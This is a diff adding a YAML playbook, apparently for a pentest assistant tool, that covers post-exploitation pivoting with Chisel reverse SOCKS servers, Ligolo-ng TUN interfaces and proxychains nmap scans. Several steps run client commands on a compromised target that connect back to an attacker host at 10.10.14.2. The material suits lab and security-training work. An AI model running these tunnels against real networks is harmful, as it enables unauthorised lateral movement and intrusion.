@@ -1,0 +1,55 @@
+id: pivoting
+name: Pivoting & Network Tunneling
+category: post-exploitation
+description: Methodology for pivoting into dual-homed subnets and internal active directory networks using Chisel, Ligolo-ng, and SSH SOCKS proxies.
+requires_shell: true
+port_triggers: []
+tags:
+  - pivoting
+  - chisel
+  - ligolo-ng
+  - tunneling
+  - socks5
+steps:
+  - id: pivot-chisel-server
+    title: Start Chisel Reverse SOCKS Server on Kali
+    phase: post-exploitation
+    purpose: Start a Chisel server on your Kali machine listening for reverse SOCKS proxy connections from the compromised host.
+    command: chisel server -p 8000 --reverse
+    expected_output:
+      - '2024/03/20 14:00:00 server: Reverse tunnelling enabled'
+      - '2024/03/20 14:00:00 server: Listening on http://0.0.0.0:8000'
+    common_mistakes:
+      - Ensure port 8000 is open and not blocked by local Kali ufw firewall.
+    if_success: Chisel server listening! Run client on compromised target.
+    if_failure: Port in use. Choose another port (e.g. 9000).
+    references:
+      - https://book.hacktricks.xyz/tunneling-and-port-forwarding/chisel-examples
+  - id: pivot-chisel-client
+    title: Connect Chisel Client from Target to Kali
+    phase: post-exploitation
+    purpose: Connect the compromised target back to your Kali server to create a SOCKS5 proxy on `127.0.0.1:1080`.
+    command: ./chisel client {{LHOST|10.10.14.2}}:8000 R:socks
+    expected_output:
+      - '2024/03/20 14:00:02 client: Connected (Latency 25ms)'
+      - '2024/03/20 14:00:02 client: tun: r:socks => socks:127.0.0.1:1080'
+    common_mistakes:
+      - On Windows, use `chisel.exe client {{LHOST}}:8000 R:socks`.
+    if_success: SOCKS5 tunnel active! Scan internal network via `proxychains4 nmap -sT -Pn {{INTERNAL_IP|172.16.1.10}}`.
+    if_failure: Connection timed out. Verify Kali IP reachability.
+    references:
+      - https://book.hacktricks.xyz/tunneling-and-port-forwarding/chisel-examples
+  - id: pivot-ligolo-tun
+    title: Ligolo-ng Fast TUN Interface Setup
+    phase: post-exploitation
+    purpose: Configure a virtual TUN interface on Kali for native kernel-level IP routing into the target internal subnet (no proxychains needed!).
+    command: sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert
+    expected_output:
+      - '[INFO] Listening on 0.0.0.0:11601'
+      - ligolo-ng >>
+    common_mistakes:
+      - Not adding the internal route (`sudo ip route add 172.16.1.0/24 dev ligolo`) after agent connects.
+    if_success: Ligolo proxy ready! Run `./ligolo-agent -connect {{LHOST|10.10.14.2}}:11601 -ignore-cert` on target.
+    if_failure: TUN interface creation requires sudo privileges on Kali.
+    references:
+      - https://book.hacktricks.xyz/tunneling-and-port-forwarding/ligolo-ng
